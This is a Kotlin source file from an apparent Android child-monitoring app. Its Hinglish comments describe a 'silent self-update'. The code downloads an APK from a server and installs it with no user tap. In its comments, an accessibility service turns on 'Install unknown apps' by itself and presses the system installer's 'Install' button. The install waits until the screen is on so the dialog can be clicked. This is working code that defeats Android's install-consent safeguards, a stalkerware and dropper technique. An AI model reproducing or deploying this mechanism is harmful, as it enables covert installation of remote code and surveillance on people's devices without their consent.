package com.familyguard.child.util

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.PowerManager
import android.os.SystemClock
import com.familyguard.child.data.Api
import com.familyguard.child.data.Store
import com.familyguard.child.receiver.UpdateReceiver
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File

/**
 * Silent self-update — "child app e kuch update karo to wo automatic phone me
 * update ho jaye bina popup ya koii notification ke".
 *
 * Flow:
 *  1. Server GitHub release se naya APK sync karta hai (har 10 min) aur online
 *     children ko `apk_update` WS message bhejta hai. Bachche ka app khud bhi
 *     har 5 min check karta hai (watchdog cycle).
 *  2. Meta `assetUpdatedAt` Store.apkAssetUpdatedAt se match — naya stamp ho to
 *     APK server se download hota hai (cacheDir, koi notification nahi).
 *  3. PackageInstaller session se install commit hota hai. System ka install
 *     confirm dialog 1-2 sec ke liye dikhta hai aur EnforcementService
 *     accessibility uska "Install" button khud click kar deta hai (install
 *     step armed hota hai commit se PEHLE) — user ka ek bhi tap nahi.
 *  4. Success par UpdateReceiver Store.apkAssetUpdatedAt likh deta hai,
 *     MY_PACKAGE_REPLACED receiver (BootReceiver) MainService wapas chala deta
 *     hai — pairing, permissions, sab data remain.
 *
 * Screen off ho to install postpone hota hai (installer dialog clickable nahi
 * hota lockscreen ke pichhe) — agli check/screen-on par khud ho jayega.
 */
object UpdateManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    @Volatile private var busy = false

    /**
     * Throttled check. Poll paths (watchdog/ping) 5 min gap (sirf chhota JSON GET
     * hai, sasta); server WS push aur parent ke "update_apk" command force=true
     * se 2 min gap par turant chalega.
     */
    fun requestCheck(ctx: Context, force: Boolean = false) {
        if (!Store.paired || Store.released || busy) return
        val now = System.currentTimeMillis()
        val gap = if (force) 2 * 60_000L else 5 * 60_000L
        if (now - Store.lastApkCheckAt < gap) return
        Store.lastApkCheckAt = now
        scope.launch {
            val st = checkAndInstall(ctx.applicationContext)
            // Phone check (mirror_diag) ko honest answer dene ke liye — "auto
            // update ni hora" ka jawab phone khud deta hai, guess nahi.
            Store.lastUpdateStatus = st
            Store.lastUpdateAt = System.currentTimeMillis()
        }
    }

    /** Returns a short status string; safe to call from anywhere. */
    suspend fun checkAndInstall(ctx: Context): String {
        if (busy) return "busy"
        busy = true
        try {
            if (!Store.paired || Store.released) return "not paired"
            if (!canInstall(ctx)) {
                // Pehli dafa ki permission (existing install par wizard dobara nahi
                // chalta): "Install unknown apps" settings khulti hai aur accessibility
                // humari "Device Health" row ka toggle KHUD ON kar deti hai —
                // ek-2 sec ki screen flash, ek bhi tap nahi. Agli check par install
                // apne aap aage badh jayega.
                Store.autoClickStep = "unknown"
                Store.autoClickUntil = SystemClock.elapsedRealtime() + 60_000L
                runCatching {
                    ctx.startActivity(
                        android.content.Intent(
                            android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            android.net.Uri.parse("package:" + ctx.packageName)
                        ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    )
                }
                return "install permission auto-grant chal raha hai — update agli cycle me"
            }
            val meta = Api.getApkMeta()
            val available = meta.get("uploaded")?.takeIf { it.isJsonPrimitive }?.asBoolean ?: false
            val url = meta.get("url")?.takeIf { it.isJsonPrimitive }?.asString.orEmpty()
            val stamp = meta.get("assetUpdatedAt")?.takeIf { it.isJsonPrimitive }?.asString.orEmpty()
            if (!available || url.isBlank() || stamp.isBlank()) return "no apk on server"
            if (stamp == Store.apkAssetUpdatedAt) return "up-to-date"
            // Lockscreen ke pichhe installer dialog par accessibility click nahi
            // kar sakta — screen on hone ka wait karo (agli cycle me ho jayega).
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isInteractive) return "screen off — postponed"

            val apk = File(ctx.cacheDir, "update_${System.currentTimeMillis()}.apk")
            try {
                Api.downloadApk(apk, url)
                if (!apk.exists() || apk.length() < 1000) return "download failed"
                // VERSION-AWARE SKIP: APK archive ka versionCode padho — agar
                // installed se chhota/barabar hai to INSTALL MAT KARO (bas stamp
                // save ho). Warna manual update ke baad bhi purana stamp bacha
                // rehta tha -> wahi APK baar-baar download + install dialog
                // pop hota rahta tha (silent update "kaam ni kar raha" lagta
                // tha). Ab: same-version APK par chupchaap stamp save — loop
                // khatam, agli naya build aane par turant install.
                val curVc = runCatching {
                    val pi = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
                    if (android.os.Build.VERSION.SDK_INT >= 28) pi.longVersionCode
                    else @Suppress("DEPRECATION") pi.versionCode.toLong()
                }.getOrDefault(0L)
                val arcVc = runCatching {
                    ctx.packageManager.getPackageArchiveInfo(apk.absolutePath, 0)?.let {
                        if (android.os.Build.VERSION.SDK_INT >= 28) it.longVersionCode
                        else @Suppress("DEPRECATION") it.versionCode.toLong()
                    }
                }.getOrNull()
                if (arcVc != null && arcVc <= curVc) {
                    Store.apkAssetUpdatedAt = stamp
                    return "already latest (build $arcVc installed)"
                }
                // "Install" auto-click ARM karo commit se PEHLE — dialog khulte hi
                // EnforcementService click kar dega (120 s window).
                Store.autoClickStep = "install"
                Store.autoClickUntil = SystemClock.elapsedRealtime() + 120_000L
                commitInstall(ctx, apk, stamp)
                return "installing"
            } finally {
                runCatching { apk.delete() }
            }
        } catch (e: Exception) {
            return "error: ${e.message ?: "failed"}"
        } finally {
            busy = false
        }
    }

    fun canInstall(ctx: Context): Boolean =
        runCatching { ctx.packageManager.canRequestPackageInstalls() }.getOrDefault(false)

    private fun commitInstall(ctx: Context, apk: File, stamp: String) {
        val installer = ctx.packageManager.packageInstaller
        val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
        val sessionId = installer.createSession(params)
        val session = installer.openSession(sessionId)
        try {
            val out = session.openWrite("child.apk", 0, apk.length())
            try {
                apk.inputStream().use { input -> input.copyTo(out) }
                // fsync ZAROORI close se pehle — closed stream par fsync fail hota hai
                session.fsync(out)
            } finally {
                runCatching { out.close() }
            }
            // Status callback: success par stamp save + file cleanup.
            val status = Intent(ctx, UpdateReceiver::class.java).putExtra("stamp", stamp)
            // PackageInstaller status receiver ke extras system khud jodta hai —
            // API 31+ par MUTABLE flag zaroori, usse neeche default hi mutable hai.
            val flags = if (android.os.Build.VERSION.SDK_INT >= 31)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT
            val sender = PendingIntent.getBroadcast(ctx, 1110, status, flags)
            session.commit(sender.intentSender)
        } finally {
            runCatching { session.close() }
        }
    }
}
